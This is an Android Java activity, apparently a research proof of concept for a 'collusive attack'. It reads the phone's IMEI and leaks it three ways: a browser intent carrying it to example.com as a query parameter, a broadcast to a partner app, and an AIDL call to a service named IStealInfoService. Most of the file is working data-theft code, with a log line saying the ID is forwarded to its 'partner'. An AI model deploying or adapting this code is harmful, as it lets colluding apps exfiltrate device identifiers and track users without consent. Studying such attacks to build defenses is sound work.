package edu.ntu.security.collusiveattack;

import java.util.List;

import edu.ntu.security.sendinfoout.aidl.IStealInfoService;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		initWidget();

	}

	//
	private Button clickButton;
	private Button broadcastButton;
	private Button aidlButton;

	/**
	 * Initialise the buttons.
	 * 1. broadcastButton: it will send a broadcast message, which is received by SendInfoOut application. 
	 * 2. aidlButton: it will invoke the sendInfoOut function defined in SendInfoOut application.
	 */
	private void initWidget() {
		clickButton = (Button) findViewById(R.id.button1);
		clickButton.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {

				Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://example.com/?data="+(getDeviceId()==null?"OEFS4339E":getDeviceId())));
				
				startActivity(intent);
			}

		});

		broadcastButton = (Button) findViewById(R.id.button2);
		broadcastButton.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				Intent intent = new Intent("edu.ntu.security.INFO_BROADCAST");
				intent.putExtra("data", getDeviceId()==null?"03223EFES":getDeviceId());
				MainActivity.this.getApplicationContext().sendBroadcast(intent);
				Log.i("GetDeviceID",
						"I got the device id, and forward to my partner");
			}

		});

		aidlButton = (Button) findViewById(R.id.button3);
		aidlButton.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				/*
				 * bindService(new Intent(IStealInfoService.class.getName()),
				 * mServiceConnection, Context.BIND_AUTO_CREATE);
				 */
				Log.i("DEBUG_FOR_REMOTE", IStealInfoService.class.getName());
				Intent intent = new Intent();
				intent.setAction("edu.ntu.security.SENDMESSAGE");
				bindService(intent, mServiceConnection,
						Context.BIND_AUTO_CREATE);

				if (mStealInfoService != null) {
					Thread thr = new Thread() {
						@Override
						public void run() {
							try {
								mStealInfoService.sendInfoOut(getDeviceId()==null?"93294DOEFED":getDeviceId());
							} catch (RemoteException e) {
								e.printStackTrace();
							}
						}
					};
					thr.start();
				}

			}
		});
	}

	IStealInfoService mStealInfoService = null;

	private ServiceConnection mServiceConnection = new ServiceConnection() {

		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mStealInfoService = IStealInfoService.Stub.asInterface(service);
		}

		@Override
		public void onServiceDisconnected(ComponentName name) {
			mStealInfoService = null;
		}

	};

	/**
	 * Get the id of the device
	 * 
	 * @return
	 */
	private String getDeviceId() {
		TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String imei = telManager.getDeviceId();
		return imei;
	}

	public static boolean isIntentAvailable(Context ctx, Intent intent) {
		final PackageManager mgr = ctx.getPackageManager();
		List<ResolveInfo> list = mgr.queryIntentActivities(intent,
				PackageManager.MATCH_DEFAULT_ONLY);
		return list.size() > 0;
	}
}
